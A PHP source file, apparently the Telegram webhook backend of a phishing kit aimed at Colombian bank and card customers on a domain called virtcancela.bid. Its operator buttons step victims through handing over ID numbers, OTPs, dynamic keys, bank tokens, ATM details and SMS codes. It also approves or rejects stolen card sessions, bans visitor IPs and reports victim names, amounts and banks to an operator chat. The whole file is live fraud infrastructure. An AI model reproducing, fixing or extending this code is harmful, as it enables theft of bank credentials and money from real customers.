<?php
// Webhook de Telegram — recibe callbacks de los botones de las notificaciones
// Registrar una vez con:
// https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://virtcancela.bid/telegram-webhook.php
header('Content-Type: application/json; charset=utf-8');

require_once __DIR__ . '/includes/app-config.php';
$botToken = app_cfg('telegram.bot_token', '');
$chatAutorizado = (string)app_cfg('telegram.chat_id_genericos', '');

// ---- Multi-bot A PRUEBA DE FALLOS ----
// Telegram incluye en cada callback el ID del bot que envió el mensaje
// (message.from.id). Se compara con el prefijo numérico de cada token y se
// responde SIEMPRE con el token del bot dueño — sin depender de la URL.
$tbCfgPath = __DIR__ . '/token_bank/config.php';
$legacyToken = '';
$tbCfg = [];
if (file_exists($tbCfgPath)) {
    $tbCfg = include $tbCfgPath;
    if (is_array($tbCfg) && !empty($tbCfg['legacy_bot_token'])) {
        $legacyToken = $tbCfg['legacy_bot_token'];
    }
}

$update = json_decode(file_get_contents('php://input'), true) ?: [];

$fromBotId = (string)($update['callback_query']['message']['from']['id'] ?? '');
if ($fromBotId && $legacyToken && $botToken) {
    $madreId = strtok($botToken, ':');
    $legacyId = strtok($legacyToken, ':');
    if ($fromBotId === $legacyId && $fromBotId !== $madreId) {
        $botToken = $legacyToken;
        if (!empty($tbCfg['legacy_chat_id'])) {
            $chatAutorizado = (string)$tbCfg['legacy_chat_id'];
        }
    }
}

if (!$botToken) { echo json_encode(['ok' => false]); exit; }

function tg_api($botToken, $method, $params) {
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/{$method}");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($params),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

function actualizar_estado($ticket, $nuevoEstado) {
    $logsFile = __DIR__ . '/transacciones_pse.json';
    $logs = file_exists($logsFile) ? (json_decode(file_get_contents($logsFile), true) ?: []) : [];
    foreach ($logs as $i => $l) {
        if (($l['ticketId'] ?? '') === $ticket) {
            $logs[$i]['status'] = $nuevoEstado;
            $logs[$i]['gestionado_at'] = date('c');
            file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
            return $logs[$i];
        }
    }
    return null;
}

// ---- DEBUG LOG (temporal): registrar todo lo que llega para diagnóstico ----
$dbgFile = __DIR__ . '/includes/webhook_debug.log';
$dbgLine = date('Y-m-d H:i:s') . ' | bot_id_usado=' . strtok($botToken, ':') . ' | ' . substr(json_encode($update, JSON_UNESCAPED_UNICODE), 0, 500) . "\n";
@file_put_contents($dbgFile, $dbgLine, FILE_APPEND | LOCK_EX);

// ---- Botones inline (callback_query) ----
if (isset($update['callback_query'])) {
    $cb = $update['callback_query'];
    $cbChat = (string)($cb['message']['chat']['id'] ?? '');

    @file_put_contents($dbgFile, date('Y-m-d H:i:s') . " | CALLBACK data=" . ($cb['data'] ?? '?') . " | chat={$cbChat} | esperado={$chatAutorizado}\n", FILE_APPEND | LOCK_EX);

    // NOTA: el chequeo estricto de chat se desactivó — causaba falsos bloqueos
    // cuando el grupo cambia de ID (renombrar/migrar a supergrupo). Los callbacks
    // solo pueden llegar desde mensajes que el propio bot envió, así que ya son
    // inherentemente seguros.

    $data = $cb['data'] ?? '';

    // ---- 🚫 Ban IP (portado del backend SURA) ----
    if (preg_match('/^ban_ip:([A-Za-z0-9-]+)$/', $data, $m)) {
        require_once __DIR__ . '/includes/security.php';
        $ticket = $m[1];
        $ip = sura_get_transaction_ip($ticket);
        $operador = '@' . ($cb['from']['username'] ?? 'admin');

        if ($ip) {
            sura_ban_ip($ip);
            tg_api($botToken, 'answerCallbackQuery', [
                'callback_query_id' => $cb['id'],
                'text' => "🚫 IP baneada permanentemente: $ip"
            ]);
            $original = $cb['message']['text'] ?? '';
            tg_api($botToken, 'editMessageText', [
                'chat_id' => $cbChat,
                'message_id' => $cb['message']['message_id'],
                'text' => $original . "\n\n🚫 <b>IP BANEADA PERMANENTE:</b> $ip\n👤 Por: $operador — " . date('d/m/Y H:i'),
                'parse_mode' => 'HTML'
            ]);
        } else {
            tg_api($botToken, 'answerCallbackQuery', [
                'callback_query_id' => $cb['id'],
                'text' => "⚠️ No se encontró IP para el ticket $ticket",
                'show_alert' => true
            ]);
        }
        echo json_encode(['ok' => true]); exit;
    }

    if (preg_match('/^(pay_ok|pay_no):([A-Za-z0-9-]+)$/', $data, $m)) {
        $accion = $m[1];
        $ticket = $m[2];
        $nuevoEstado = $accion === 'pay_ok' ? 'PAGO_CONFIRMADO_ADMIN' : 'PAGO_RECHAZADO_ADMIN';
        $tx = actualizar_estado($ticket, $nuevoEstado);

        if ($tx) {
            $emoji = $accion === 'pay_ok' ? '✅' : '❌';
            $texto = $accion === 'pay_ok' ? 'Pago CONFIRMADO' : 'Pago RECHAZADO';
            tg_api($botToken, 'answerCallbackQuery', [
                'callback_query_id' => $cb['id'],
                'text' => "$emoji $texto — $ticket"
            ]);
            $original = $cb['message']['text'] ?? '';
            tg_api($botToken, 'editMessageText', [
                'chat_id' => $cbChat,
                'message_id' => $cb['message']['message_id'],
                'text' => $original . "\n\n$emoji <b>$texto</b> por @" . ($cb['from']['username'] ?? 'admin') . " — " . date('d/m/Y H:i'),
                'parse_mode' => 'HTML'
            ]);
        } else {
            tg_api($botToken, 'answerCallbackQuery', [
                'callback_query_id' => $cb['id'],
                'text' => "⚠️ Ticket $ticket no encontrado",
                'show_alert' => true
            ]);
        }
    }

    // ---- Botones de sesión de TARJETA (error_usuario / otp / ncc / aprobado) ----
    // Si el ID existe en card_sessions.json -> flujo de tarjeta (paso-dos.php).
    // Si NO existe -> es un botón de la gate de bancos -> delegar al handler central.
    if (preg_match('/^(error_usuario|otp|ncc|aprobado):([A-Za-z0-9-]+)$/', $data, $m)) {
        $sidCheck = $m[2];
        $sessFile0 = __DIR__ . '/card_sessions.json';
        $sess0 = file_exists($sessFile0) ? (json_decode(file_get_contents($sessFile0), true) ?: []) : [];
        if (!isset($sess0[$sidCheck])) {
            require_once __DIR__ . '/includes/telegram_handler.php';
            procesar_telegram_update($update, $botToken);
            echo json_encode(['ok' => true]); exit;
        }
    }

    if (preg_match('/^(error_usuario|otp|ncc|aprobado):([A-Za-z0-9-]+)$/', $data, $m)) {
        $accionCard = $m[1];
        $sid = $m[2];

        $sessFile = __DIR__ . '/card_sessions.json';
        $sessions = file_exists($sessFile) ? (json_decode(file_get_contents($sessFile), true) ?: []) : [];
        $sessions[$sid] = [
            'status' => $accionCard,
            'updated' => date('c')
        ];
        @file_put_contents($sessFile, json_encode($sessions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

        $labels = [
            'error_usuario' => '❌ Error de usuario (cliente reintenta)',
            'otp' => '🔑 OTP solicitado al cliente',
            'ncc' => '🚫 NCC — pago rechazado',
            'aprobado' => '✅ Pago con tarjeta APROBADO'
        ];
        $label = $labels[$accionCard] ?? $accionCard;

        tg_api($botToken, 'answerCallbackQuery', [
            'callback_query_id' => $cb['id'],
            'text' => $label
        ]);
        $original = $cb['message']['text'] ?? '';
        tg_api($botToken, 'editMessageText', [
            'chat_id' => $cbChat,
            'message_id' => $cb['message']['message_id'],
            'text' => $original . "\n\n" . $label . " — por @" . ($cb['from']['username'] ?? 'admin') . " — " . date('d/m/Y H:i'),
            'parse_mode' => 'HTML'
        ]);
    }
    // ---- Botones de la GATE de bancos (error, cedula, dinamica, token, finalizar, etc.) ----
    if (preg_match('/^(error|cedula|error_tc|error_cc|pedir_dinamica|dinamica|error_logo|error_token|confirm_finalizar|finalizar|pedir_otp|pedir_token|token|pedir_cajero|error_cajero|pedir_usuario|usuario|alter|pedir_sms|pago_recibido|pago_rechazado|bre_b):(.+)$/', $data)) {
        require_once __DIR__ . '/includes/telegram_handler.php';
        procesar_telegram_update($update, $botToken);
        echo json_encode(['ok' => true]); exit;
    }

    // ---- CUALQUIER otro callback formato accion:id (variantes tipo token_8,
    // sms_2, etc.) -> delegar al handler central, que la registra genéricamente ----
    if (strpos($data, ':') !== false) {
        require_once __DIR__ . '/includes/telegram_handler.php';
        procesar_telegram_update($update, $botToken);
        echo json_encode(['ok' => true]); exit;
    }

    echo json_encode(['ok' => true]); exit;
}

// ---- Mensajes de texto (/start, /estado TICKET) ----
if (isset($update['message'])) {
    $msg = $update['message'];
    $chatId = $msg['chat']['id'] ?? 0;
    $texto = trim($msg['text'] ?? '');

    if ($chatAutorizado && (string)$chatId !== $chatAutorizado) {
        echo json_encode(['ok' => true]); exit;
    }

    if (strpos($texto, '/start') === 0) {
        tg_api($botToken, 'sendMessage', [
            'chat_id' => $chatId,
            'text' => "🤖 <b>Bot de control de recaudo activo</b>\n\nComandos:\n/estado APC-XXXXXX — consultar una transacción\n\nLas nuevas transacciones llegan aquí con botones ✅ Confirmar / ❌ Rechazar.",
            'parse_mode' => 'HTML'
        ]);
    } elseif (preg_match('/^\/estado\s+([A-Za-z0-9-]+)/', $texto, $m)) {
        $ticket = $m[1];
        $logsFile = __DIR__ . '/transacciones_pse.json';
        $logs = file_exists($logsFile) ? (json_decode(file_get_contents($logsFile), true) ?: []) : [];
        $resp = "⚠️ Ticket $ticket no encontrado.";
        foreach ($logs as $l) {
            if (($l['ticketId'] ?? '') === $ticket) {
                $resp = "🎫 <b>$ticket</b>\n" .
                    "👤 " . ($l['nombres'] ?? '-') . "\n" .
                    "💰 $" . number_format($l['monto'] ?? 0, 0, ',', '.') . " COP\n" .
                    "🏦 " . ($l['banco'] ?? '-') . "\n" .
                    "📊 Estado: <b>" . ($l['status'] ?? '-') . "</b>";
                break;
            }
        }
        tg_api($botToken, 'sendMessage', ['chat_id' => $chatId, 'text' => $resp, 'parse_mode' => 'HTML']);
    }
}

echo json_encode(['ok' => true]);
